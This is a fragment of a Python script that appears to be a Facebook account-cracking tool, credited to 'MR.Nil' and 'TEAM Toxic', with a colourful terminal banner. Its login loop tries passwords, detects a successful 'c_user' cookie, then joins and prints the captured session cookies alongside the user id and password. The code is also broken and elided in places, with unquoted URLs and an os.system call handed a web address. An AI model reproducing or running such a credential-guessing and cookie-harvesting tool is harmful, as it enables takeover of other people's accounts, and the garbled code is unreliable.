...
def uaku():
	try:
		...
		a=requests.get(https://github.com/Nil500/approved.txt)
		ua=open('.bbnew.txt','w')
...
def jalan(z):
    for e in z + '\n':
        ...
        sys.stdout.flush()
        time.sleep(0.03)
os.system(https://github.com/Nil500/approved.txt)
...
logo ="""\033[1;97m
       ...
       \033[1;33m##     ## #### ##     ## ######## 
\033[1;32m[+]==============================================
\033[1;32m[+] \033[1;33mCREATED BY   :  \033[1;33mMR.Nil
\033[1;32m[+] \033[1;34mON FACEBOK   :  \033[1;34mMR.Nil
\033[1;32m[+] \033[1;35mON GITHUB    :  \033[1;35mNil-500
\033[1;32m[+] \033[1;36mTOOL STATUS  :  \033[1;36mRANDOM
\033[1;32m[+] \033[1;36mTOOL VIRSION :  \033[1;36m2.8.1
\033[1;32m[+]==============================================   
            \033[1;31m• \033[1;33m• \033[1;34m• \033[1;36mTEAM Toxic \033[1;31m• \033[1;33m• \033[1;34m• """
BLUE = '\033[1;32m'
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[24:39]
                print('\033[1;95m[Nil-CP] '+cid+' | '+ps+'\033[0;97m')
                cek_apk(session,coki)
